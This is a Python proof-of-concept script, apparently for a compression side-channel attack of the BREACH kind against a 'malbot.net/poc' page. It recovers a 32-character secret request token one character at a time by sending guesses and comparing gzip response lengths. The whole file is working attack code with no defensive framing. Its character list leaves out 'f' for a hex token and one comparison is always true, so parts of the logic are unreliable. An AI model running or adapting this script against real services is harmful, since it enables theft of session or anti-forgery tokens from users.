import urllib.parse
import urllib.request

def enviarPeticion(req,secreto,extra):
    url = "http://malbot.net/poc/?request_token='"+ secreto + extra
    print(url)
    req = urllib.request.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
    req.add_header('Accept-Encoding','gzip, deflate')
    return req
def obtenerLongitud(req):
    with urllib.request.urlopen(req) as response:
        the_page = response.read()
        longitud=len(the_page)
        print(longitud)
        return longitud    
req=0
secreto = ''
longitud=32
breaks = "{}{}{}"
menor = 100000
index=0
index1= 100
caracteres=[48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101]
for j in range(longitud):
    menor=100000
    index = 100
    for i in range(len(caracteres)):
        caracter = chr(caracteres[i])
        req=enviarPeticion(req, secreto, caracter + breaks + "'")
        longitud1=obtenerLongitud(req)
        if(longitud1<= menor):
            index = i
            menor= longitud1
            if(longitud1==menor):
                req=enviarPeticion(req, secreto, breaks + caracter + "'")
                longitud2=obtenerLongitud(req)                                
                if ((longitud1-longitud2) < 0):
                    print ("HOLA")
                    index1 = i
            print(chr(caracteres[index]))
    if(index1!=100):
        secreto = secreto + chr(caracteres[index1])
    else:
        secreto = secreto + chr(caracteres[index])
    print(secreto)       
